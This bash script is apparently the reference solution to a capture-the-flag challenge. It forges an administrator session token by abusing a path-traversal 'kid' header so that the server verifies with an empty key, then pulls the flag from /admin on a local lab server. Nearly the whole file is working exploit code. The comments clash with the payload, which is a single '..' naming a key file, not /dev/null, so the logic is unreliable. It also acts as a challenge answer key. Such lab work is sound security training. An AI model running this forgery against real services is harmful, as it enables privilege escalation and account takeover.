#!/usr/bin/env bash
# Reference solution for challenge 04: verification key chosen by the token.
#
# The server locates its HMAC key with readFileSync(KEY_DIR + kid). `kid`
# travels inside the token, so the attacker chooses the file. Pointing it at
# /dev/null yields an empty key, and an HMAC over a known input under a known
# (empty) key is computable by anyone.
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:8804}"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# shellcheck source=../../_shared/tools/http.sh
source "$ROOT/_shared/tools/http.sh"
FORGE="$ROOT/_shared/tools/forge.py"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

# Extra '..' segments are harmless once the path is already at the root, so a
# single payload works regardless of how deep KEY_DIR is.
TRAVERSAL='../key-2026-02.key'

echo "== 1. sign in and capture a genuine token =="
"${HTTP[@]}" -c "$JAR" -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"
TOKEN=$(awk '/session/{print $7}' "$JAR")
echo "   session cookie captured (${#TOKEN} bytes)"

echo
echo "== 2. replay the genuine token against /admin =="
"${HTTP[@]}" -b "$JAR" -o /dev/null -w '   HTTP %{http_code}\n' "$BASE/admin"

echo
echo "== 3. forge a token whose kid points at an empty file =="
FORGED=$(python3 "$FORGE" --kid "$TRAVERSAL" --key-file /dev/null \
  --sub administrator --original "$TOKEN" | tail -1)

echo
echo "== 4. replay it against /admin =="
"${HTTP[@]}" -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}' | head -1
